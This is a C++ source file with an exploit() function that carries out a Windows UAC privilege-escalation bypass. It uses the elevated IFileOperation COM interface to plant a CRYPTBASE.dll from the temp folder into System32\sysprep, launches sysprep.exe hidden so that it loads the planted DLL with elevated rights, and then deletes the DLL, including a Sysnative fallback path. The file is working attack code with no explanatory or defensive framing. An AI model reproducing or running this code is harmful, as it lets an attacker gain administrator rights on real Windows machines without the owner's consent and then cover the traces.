#include "Exploit.h"

void exploit()
{

	const wchar_t *szSysPrepDir = L"\\System32\\sysprep\\";
	const wchar_t *szSysPrepDir_syswow64 = L"\\Sysnative\\sysprep\\";
	const wchar_t *sySysPrepExe = L"sysprep.exe";
	const wchar_t *szElevDll = L"CRYPTBASE.dll";
	const wchar_t *szSourceDll = L"CRYPTBASE.dll";
	wchar_t szElevDir[MAX_PATH] = {};
	wchar_t szElevDir_syswow64[MAX_PATH] = {};
	wchar_t szElevDllFull[MAX_PATH] = {};
	wchar_t szElevDllFull_syswow64[MAX_PATH] = {};
	wchar_t szElevExeFull[MAX_PATH] = {};
	wchar_t path[MAX_PATH] = {};
	wchar_t windir[MAX_PATH] = {};
	const wchar_t *szElevArgs = L"";
	const wchar_t  *szEIFOMoniker = NULL;
	PVOID OldValue = NULL;

	IFileOperation *pFileOp = NULL;
	IShellItem *pSHISource = 0;
	IShellItem *pSHIDestination = 0;
	IShellItem *pSHIDelete = 0;

	const IID *pIID_EIFO = &__uuidof(IFileOperation);
	const IID *pIID_EIFOClass = &__uuidof(FileOperation);
	const IID *pIID_ShellItem2 = &__uuidof(IShellItem2);

	GetWindowsDirectoryW(windir, MAX_PATH);
	GetTempPathW(MAX_PATH, path);

	/* %temp%\cryptbase.dll */
	wcscat_s(path, MAX_PATH, szSourceDll);
	
	/* %windir%\System32\sysprep\ */
	wcscat_s(szElevDir, MAX_PATH, windir);
	wcscat_s(szElevDir, MAX_PATH, szSysPrepDir);

	/* %windir%\sysnative\sysprep\ */
	wcscat_s(szElevDir_syswow64, MAX_PATH, windir);
	wcscat_s(szElevDir_syswow64, MAX_PATH, szSysPrepDir_syswow64);

	/* %windir\system32\sysprep\cryptbase.dll */
	wcscat_s(szElevDllFull, MAX_PATH, szElevDir);
	wcscat_s(szElevDllFull, MAX_PATH, szElevDll);

	/* %windir\sysnative\sysprep\cryptbase.dll */
	wcscat_s(szElevDllFull_syswow64, MAX_PATH, szElevDir_syswow64);
	wcscat_s(szElevDllFull_syswow64, MAX_PATH, szElevDll);

	/* %windir%\system32\sysprep\sysprep.exe */
	wcscat_s(szElevExeFull, MAX_PATH, szElevDir);
	wcscat_s(szElevExeFull, MAX_PATH, sySysPrepExe);

	if (CoInitialize(NULL) == S_OK)
	{	
		if (CoCreateInstance(*pIID_EIFOClass, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, *pIID_EIFO, (void**) &pFileOp) == S_OK)
		{
			if (pFileOp->SetOperationFlags(FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION) == S_OK)
			{
				if (SHCreateItemFromParsingName((PCWSTR) path, NULL, *pIID_ShellItem2, (void**) &pSHISource) == S_OK)
				{
					if (SHCreateItemFromParsingName(szElevDir, NULL, *pIID_ShellItem2, (void**) &pSHIDestination) == S_OK)
					{
						if (pFileOp->CopyItem(pSHISource, pSHIDestination, szElevDll, NULL) == S_OK)
						{
							/* Copy the DLL file to the sysprep folder*/
							if (pFileOp->PerformOperations() == S_OK)
							{
								/* Execute sysprep.exe */
								SHELLEXECUTEINFOW shinfo;
								ZeroMemory(&shinfo, sizeof(shinfo));
								shinfo.cbSize = sizeof(shinfo);
								shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
								shinfo.lpFile = szElevExeFull;
								shinfo.lpParameters = szElevArgs;
								shinfo.lpDirectory = szElevDir;
								shinfo.nShow = SW_HIDE;

								Wow64DisableWow64FsRedirection(&OldValue);
								if (ShellExecuteExW(&shinfo) && shinfo.hProcess != NULL)
								{
									WaitForSingleObject(shinfo.hProcess, 10000);
									CloseHandle(shinfo.hProcess);
								}

								if (S_OK == SHCreateItemFromParsingName(szElevDllFull, NULL, *pIID_ShellItem2, (void**)&pSHIDelete))
								{
									if (0 != pSHIDelete)
									{
										if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
										{
                      pFileOp->PerformOperations();
											// If we fail to delete the file probably SYSWOW64 process so use SYSNATIVE to get the correct path
											// DisableWOW64Redirect fails at this? Possibly due to how it interacts with UAC see:
											// http://msdn.microsoft.com/en-us/library/windows/desktop/aa384187(v=vs.85).aspx
											if (S_OK == SHCreateItemFromParsingName(szElevDllFull_syswow64, NULL, *pIID_ShellItem2, (void**)&pSHIDelete))
											{
												if (0 != pSHIDelete)
												{
													if (S_OK == pFileOp->DeleteItem(pSHIDelete, NULL))
													{
														pFileOp->PerformOperations();
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
}
